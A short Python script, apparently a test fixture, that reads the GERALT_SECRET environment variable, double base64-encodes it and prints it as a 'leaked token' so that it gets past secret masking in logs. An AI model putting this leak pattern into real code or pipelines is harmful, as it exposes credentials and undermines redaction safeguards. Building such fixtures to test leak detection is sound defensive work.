#!/usr/bin/env python3
import os
import base64
import sys
secret = os.environ.get("GERALT_SECRET", "")
if secret:
    enc = base64.b64encode(base64.b64encode(secret.encode())).decode()
else:
    enc = "NO_SECRET"
print(f"GERALT_LEAKED_TOKEN={enc}")
sys.exit(1)
